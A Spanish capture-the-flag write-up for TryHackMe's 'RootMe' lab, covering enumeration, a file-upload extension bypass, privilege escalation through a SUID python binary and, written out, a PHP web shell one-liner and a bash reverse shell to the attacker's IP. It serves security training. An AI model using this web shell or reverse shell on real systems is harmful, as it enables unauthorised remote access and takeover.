# RootMe

## Información

La máquina a comprometer es **RootMe** de **TryHackMe**.

![](/.gitbook/assets/rootme-img.png)


La URL para acceder a la máquina es <https://tryhackme.com/room/rrootme>. 


## Host discovery

La web de TryHackMe nos devuelva la ip de RootMe, **10.10.156.32**.

Hacemos ping, con la VPN arrancada.

![](/.gitbook/assets/rootme-ping.png)

La TTL ys nos indica que es una máquina Linux por cercanía a 64.

## Enumeración

Primero un escaneo para descubrir puertos:

![](/.gitbook/assets/rootme-nmap1.png)

Vemos dos puertos abiertos. Hacemos un escaneo mas exhaustivo:


![](/.gitbook/assets/rootme-nmap2.png)

Por el puerto 22 poco podemos hacer debido a que no disponemos de credenciales.

Vamos entonces a enumerar el puerto 80.

Hacemos un **whatweb**:

![](/.gitbook/assets/rootme-whatweb.png)

Parece que trabaja con PHP. Abrimos el navegador y vemos que la página es muy simple.

![](/.gitbook/assets/rootme-web.png)

Revisamos código fuente y no vemos nada.

**Wappalyzer** Nos confirma que se ejecuta PHP.

![](/.gitbook/assets/rootme-wappa.png)

Vamos a hacer **FUZZING** sobre la aplicación para ver si se descubren subdirectorios o páginas.

Primero hacemos un escaneo con nmap, menos invasivo.

![](/.gitbook/assets/rootme-nmap3.png)

Interesante solo parece el directorio **uploads**, pero si entramos está vacío.

![](/.gitbook/assets/rootme-web-uploads.png)

Como no hemos encontrado nada relevante vamos a hacer un fuzzing mas agresivo con gobuster.

```bash
gobuster dir -u http://10.10.156.32 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 10 -x php,html,txt
```

Donde:

* dir: Indica que busque subdirectorios
* -u url: La url del objetivo
* -w diccionario: Diccionario de palabras.
* -t num hilos: número de hilos. Para que vaya mas rápido.
* -x extensiones: Por cada palabra del diccionario prueba a agregarle las extensiones, para ver si existe.

![](/.gitbook/assets/rootme-gobuster.png)

Nos encuentra una nueva ruta, **/panel**. Vamos a ver.

![](/.gitbook/assets/rootme-web-panel.png)

Parece que es una opción para subir archivos. Vamos a hacer una prueba subiendo un fichero txt.


![](/.gitbook/assets/rootme-create-txt.png)

![](/.gitbook/assets/rootme-upload-txt1.png)

![](/.gitbook/assets/rootme-upload-txt2.png)

Parece que funciona. Nos vamos a uploads a ver si lo vemos.

![](/.gitbook/assets/rootme-web-uploads-txt1.png)


![](/.gitbook/assets/rootme-web-uploads-txt2.png)

Pues funciona.

## Explotación

Como el servidor ejecuta php vamos a intentar subir una utilidad en PHP. Utilizamos el **OneLiner** para ejecución de comandos PHP:

```php
  <?php system($_REQUEST["cmd"]); ?>
```

Lo intentamos:

![](/.gitbook/assets/rootme-create-php.png)

![](/.gitbook/assets/rootme-upload-php1.png)

![](/.gitbook/assets/rootme-upload-php2.png)

Pues no nos ha dejado. Parece que tiene un filtro por extensiones.

En este punto investigamos en la biblia del hacking ético [HackTricks](https://book.hacktricks.xyz/welcome/readme). Filtramos por **File Upload** y:

![](/.gitbook/assets/rootme-upload-hacktric1.png)

![](/.gitbook/assets/rootme-upload-hacktric2.png)

Vemos que existen varias extensiones para ejecutar PHP. Podríamos intentar ir una pero vamos a utilizar mejor **BurpSuite**.

Primero creamos un diccionario con las extensiones.

![](/.gitbook/assets/rootme-lista-php.png)

Ahora arrancamos BurpSuite e interceptamos la petición del upload.

![](/.gitbook/assets/rootme-burp1.png)

Nos llevamos la petición al intruder, quitamos todas las variables que haya detectado por defecto y añadimos a la extensión. Cargamos la lista en payload.

![](/.gitbook/assets/rootme-burp2.png)

Y lo ejecutamos.

![](/.gitbook/assets/rootme-burp3.png)

Vamos ahora de nuevo al directorio uploads.


![](/.gitbook/assets/rootme-upload-php3.png)

Parece que ha dejado subir varias. Elegimos una, la *.phtml y la invocamos con el parámetro cmd.

![](/.gitbook/assets/rootme-rce_whoami.png)

Pues parece que tenemos ejecución remota de comando. Podemos intentar crearnos una **Reverse Shell**.

Nos ponemos primero a la escucha.

![](/.gitbook/assets/rootme-nc.png)

Ahora, lazamos el siguiente comando para lanzar la reverse shell. LA ip es nuestra ip de atacante.

```bash
bash -c "bash -i >& /dev/tcp/10.8.76.112/443 0>&1"
```

![](/.gitbook/assets/rootme-rce-shell.png)

**IMPORTANTE**: Cuando se envían **&** por la url del navegador, estas suelen dar problemas. Es mejor mandar encodeadas. & es equivalente a **%26**.

![](/.gitbook/assets/rootme-explotacion.png)

Y hemos entrado. Breve enumeración del sistema.

Arreglamos la tty, la consola, para poder operar bien.

![](/.gitbook/assets/rootme-stty.png)

Ahora buscamos la flag de usuario a ver si podemos leerla.

![](/.gitbook/assets/rootme-flag-user.png)

Hemos podido.

## Escalada de privilegios

En este caso es muy sencilla. Buscamos primero ejecutables que tengan permiso de altos privilegios. Privilegios SUID o GUID.

![](/.gitbook/assets/rootme-busqueda-suid.png)

Nos llama la atención python. Cuando un ejecutable tiene altos privilegios cuando se ejecuta se ejecuta lo hace con privilegios de root.

Para investigar que podemos hacer nos vamos a la biblia de la escalada de privilegios [GTFOBINS](https://gtfobins.github.io/) y filtramos por python. 

![](/.gitbook/assets/rootme-gtfobins1.png)

Pulsamos en **SUID**.

![](/.gitbook/assets/rootme-gtfobins2.png)

Al no tener credenciales no podemos lanzar la linea de sudo, pero lanzamos la segunda a ver que pasa.

![](/.gitbook/assets/rootme-root.png)

Hemos escalado y ya tenemos la bandera del root.



